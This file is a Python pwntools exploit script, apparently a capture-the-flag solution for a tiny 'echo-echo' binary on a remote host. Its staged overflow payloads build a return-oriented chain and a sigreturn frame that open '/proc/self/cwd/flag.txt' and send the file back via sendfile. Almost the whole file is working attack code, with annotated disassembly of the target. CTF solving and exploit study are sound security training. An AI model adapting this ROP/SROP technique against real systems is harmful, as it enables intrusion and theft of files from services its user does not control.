#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF('./echo-echo')

host, port = "3.97.113.25", "9002"

p = remote(host,port)

'''
0000000000400080 <_start>:
  400080:	68 9e 00 40 00       	push   0x40009e
  400085:	bf 00 00 00 00       	mov    edi,0x0
  40008a:	48 89 e6             	mov    rsi,rsp
  40008d:	48 83 ee 08          	sub    rsi,0x8
  400091:	ba 2c 01 00 00       	mov    edx,0x12c
  400096:	b8 00 00 00 00       	mov    eax,0x0
  40009b:	0f 05                	syscall 
  40009d:	c3                   	ret    

000000000040009e <_write>:
  40009e:	68 bc 00 40 00       	push   0x4000bc
  4000a3:	48 89 e6             	mov    rsi,rsp
  4000a6:	48 83 ee 08          	sub    rsi,0x8
  4000aa:	ba 08 00 00 00       	mov    edx,0x8
  4000af:	b8 01 00 00 00       	mov    eax,0x1
  4000b4:	bf 01 00 00 00       	mov    edi,0x1
  4000b9:	0f 05                	syscall 
  4000bb:	c3                   	ret    

00000000004000bc <_exit>:
  4000bc:	b8 3c 00 00 00       	mov    eax,0x3c
  4000c1:	0f 05                	syscall 
'''

# sendfile sigrop frame ; send us back the opened file via stdout
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 40
frame.rdi = 1		# stdout
frame.rsi = 5		# remote fd for file opened (found after some tries)
frame.rdx = 0
frame.r10 = 512	
frame.rsp = 0x400800	# any address (will crash after output)
frame.rip = 0x40009b    # syscall gadget

frame = bytes(frame)
frame = frame[0:0xd0]
print(hexdump(frame))

gadget1 = 0x4000a3

# first return back to read, but at sub rsi,8 to write before our buffer the filename
payload = p64(0xdeadbeef)+p64(0x40008d)
payload = payload.ljust(0x12c,'\x00')
p.send(payload)

# send the filename to open and continue ROPPING, sometimes output 8 bytes, to stop between read & write
payload2 = '/proc/self/cwd/flag.txt'.ljust(24,'\x00')+p64(0x40009b)+p64(0x4000a3)+p64(0x400085)
# set the length of this payload to 257, to set eax=257 for next part (openfileat syscall)
payload2 = payload2.ljust(257,b'\x00')
p.send(payload2)

print(p.recv(8))

# put the frame for the sigrop on stack
payload3 = p64(0xdeadbeef)+p64(0x400085)+p64(0xdeadbeef)+frame
payload3 = payload3.ljust(0x12c,'\x00')
p.send(payload3)

# set this payload length to 15, to set eax=15 for sigreturn syscall
payload4 = p64(0xdeadbeef)+p64(0x40009b)[0:7]
payload4 = payload4.ljust(15,b'\x00')
p.send(payload4)

# we receive back flag now send by the sendfile sigrop
p.interactive()

